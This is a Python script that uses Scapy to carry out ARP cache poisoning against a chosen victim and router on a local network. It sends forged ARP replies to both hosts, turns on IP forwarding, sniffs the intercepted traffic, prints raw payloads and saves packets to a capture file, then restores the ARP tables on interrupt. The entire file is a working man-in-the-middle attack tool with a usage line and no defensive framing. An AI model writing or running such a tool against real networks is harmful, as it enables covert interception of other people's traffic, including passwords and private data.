#!/usr/bin/env python3
"""
Usage: arp_cache_poison_scapy.py --interface eth0 --victim-ip 192.168.1.10 --router-ip 192.168.1.1
"""
import os
import sys
import time
import argparse
from scapy.all import *

parser = argparse.ArgumentParser(description="ARP cache poisoning with Scapy.")
parser.add_argument("--interface", required=True, help="Network interface, e.g. eth0")
parser.add_argument("--victim-ip", required=True, help="Victim IPv4 address")
parser.add_argument("--router-ip", required=True, help="Router IPv4 address")
args = parser.parse_args()

interface = args.interface
victimIP = args.victim_ip
routerIP = args.router_ip

def MACsnag(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src
# ip="192.168.56.101"

def Spoof(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def Restore(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(
        ARP(
            op=2,
            pdst=routerIP,
            psrc=victimIP,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=victimMAC,
        ),
        count=4,
    )
    send(
        ARP(
            op=2,
            pdst=victimIP,
            psrc=routerIP,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=routerMAC,
        ),
        count=4,
    )

def sniffer():
    pkts = sniff(
        iface=interface,
        count=10,
        prn=lambda x: x.sprintf(
            " Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"
        ),
    )
    wrpcap("temp.pcap", pkts)

def MiddleMan():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while True:
        try:
            Spoof(routerIP, victimIP)
            time.sleep(1)
            sniffer()
        except KeyboardInterrupt:
            Restore(routerIP, victimIP)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            sys.exit(1)


if __name__ == "__main__":
    MiddleMan()




